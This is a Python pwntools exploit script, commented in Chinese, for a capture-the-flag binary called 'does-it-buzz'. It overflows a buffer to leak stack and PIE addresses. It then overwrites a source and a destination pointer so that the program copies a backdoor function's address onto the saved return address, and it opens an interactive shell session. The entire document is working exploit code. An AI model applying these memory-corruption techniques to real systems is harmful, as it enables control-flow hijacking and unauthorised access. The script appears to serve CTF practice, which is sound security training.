#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.log_level = "info"


def exploit():
    p = process("/challenge/does-it-buzz")

    # 推进到第 5 次循环 (var_24h == 5) 以触发 Buzz
    for i in range(6):
        p.recvuntil(f"{i}: ".encode())
        if i < 5:
            p.send(b"A")

    payload_leak_stack = b"A" * 56 + b"\xff\xff\xff\xff"
    p.send(payload_leak_stack)

    p.recvuntil(b"You entered: " + payload_leak_stack)
    stack_leak = u64(p.recv(6).ljust(8, b"\x00"))

    buf_addr = stack_leak - 0x44
    rbp_addr = buf_addr + 0x70
    log.info(f"[+] Stack Leaked! buf address: {hex(buf_addr)}")

    p.recvuntil(b"0: ")

    payload_leak_pie = b"A" * 56 + b"\xff\xff\xff\xff"
    p.send(payload_leak_pie)

    p.recvuntil(b"You entered: " + payload_leak_pie)
    pie_leak = u64(p.recv(6).ljust(8, b"\x00"))

    # 注意这里的偏移：does-it-buzz 的 FizzBuzz 字符串在 0x4098
    pie_base = pie_leak - 0x4098
    log.info(f"[+] PIE Leaked! base address: {hex(pie_base)}")

    # --- 阶段三：The Arch Way - 规避空字符陷阱 ---
    p.recvuntil(b"0: ")

    sym_win = pie_base + 0x12C9  # 后门函数地址
    saved_rip_addr = rbp_addr + 0x8  # Canary 身后的返回地址

    # 破局点：把 src_addr 往后挪一个字节，指向 buf_addr + 0x15
    # 完美避开 rbp - 0x5c 这个被强制清零的地雷
    src_addr = buf_addr + 0x15

    # 重新构造极简内存布局：
    # 0: b"A" (这个字节献祭掉，让程序去清零吧)
    # 1: sym_win (真正的后门地址从偏移 1 开始)
    payload = b"X" + p64(sym_win)
    payload = payload.ljust(56, b"A")
    payload += p32(16)  # 56: var_24h 设为 16，打断循环
    payload += p64(src_addr)  # 60: 劫持 src 去读我们的 sym_win
    payload += p64(saved_rip_addr)  # 68: 劫持 dest 写到返回地址上

    p.send(payload)
    p.interactive()


if __name__ == "__main__":
    exploit()
